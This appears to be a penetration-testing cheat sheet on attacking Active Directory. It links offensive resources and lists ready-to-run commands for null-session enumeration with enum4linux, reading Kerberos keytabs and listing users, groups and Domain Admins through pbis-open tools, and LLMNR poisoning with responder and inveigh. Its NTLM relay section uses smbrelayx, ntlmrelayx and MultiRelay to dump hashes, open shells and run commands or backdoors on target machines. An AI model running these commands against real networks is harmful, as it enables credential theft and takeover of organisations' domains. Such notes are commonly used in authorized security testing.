---
description: MS AD Enumeration
---

# Active Directory

[Most common paths to AD compromise](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#most-common-paths-to-ad-compromise)

[https://zer1t0.gitlab.io/posts/attacking\_ad/](https://zer1t0.gitlab.io/posts/attacking\_ad/)

## enum4linux

```
enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>
```

## Kerberos

{% content-ref url="kerberos.md" %}
[kerberos.md](kerberos.md)
{% endcontent-ref %}

## LDAP \[389,636,3268,3269]

{% content-ref url="ldap.md" %}
[ldap.md](ldap.md)
{% endcontent-ref %}

## NTLM

[Force NTLM Privileged Authentication](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/printers-spooler-service-abuse)

[https://github.com/cube0x0/SharpSystemTriggers](https://github.com/cube0x0/SharpSystemTriggers)

## pbis-open

[https://github.com/BeyondTrust/pbis-open/](https://github.com/BeyondTrust/pbis-open/)

`curl -LO` [`https://github.com/BeyondTrust/pbis-open/releases/download/9.1.0/pbis-open-9.1.0.551.linux.x86_64.deb.sh`](https://github.com/BeyondTrust/pbis-open/releases/download/9.1.0/pbis-open-9.1.0.551.linux.x86\_64.deb.sh)``

```
#Read keytab file
./klist -k /etc/krb5.keytab

#Get known domains info
./get-status
./lsa get-status

#Get basic metrics
./get-metrics
./lsa get-metrics

#Get users
./enum-users
./lsa enum-users

#Get groups
./enum-groups
./lsa enum-groups

#Get all kind of objects
./enum-objects
./lsa enum-objects

#Get groups of a user
./list-groups-for-user <username>
./lsa list-groups-for-user <username>
#Get groups of each user
./enum-users | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do ./list-groups-for-user "$name"; echo -e "========================\n"; done

#Get users of a group
./enum-members --by-name "domain admins"
./lsa enum-members --by-name "domain admins"
#Get users of each group
./enum-groups | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do echo "$name"; ./enum-members --by-name "$name"; echo -e "========================\n"; done

#Get description of each user
./adtool -a search-user --name CN="*" --keytab=/etc/krb5.keytab -n <Username> | grep "CN" | while read line; do
    echo "$line";
    ./adtool --keytab=/etc/krb5.keytab -n <username> -a lookup-object --dn="$line" --attr "description";
    echo "======================"
done
```

## Poisoning

responder

inveigh [https://github.com/Kevin-Robertson/Inveigh/releases/latest](https://github.com/Kevin-Robertson/Inveigh/releases/latest)

### NTLM Relay (only if SMB signing disabled)

#### forwarding: portbender

&#x20; [https://github.com/praetorian-inc/PortBender/releases/latest](https://github.com/praetorian-inc/PortBender/releases/latest)

#### forwarding smbrelayx.py

```
python3 smbrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
# By default it will just dump hashes
# To execute a command use: -c "ipconfig"
# To execute a backdoor use: -e "/path/to/backdoor

# Attack through socks proxy
proxychains python3 ntlmrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
```

#### forwarding multirelay ( _**/usr/share/responder/tools)**_

```
python MultiRelay.py -t $TARGET -u <user>
python MultiRelay.py -t <IP target> -u ALL # If "ALL" then all users are relayed
# By default a shell is returned
python MultiRelay.py -t <IP target> -u ALL -c whoami #-c to execute command
python MultiRelay.py -t <IP target> -u ALL -d #-d to dump hashes

# Use proxychains if you need to route the traffic to reach the attacked ip
```

## SMB

{% content-ref url="../services/smb-139-445.md" %}
[smb-139-445.md](../services/smb-139-445.md)
{% endcontent-ref %}
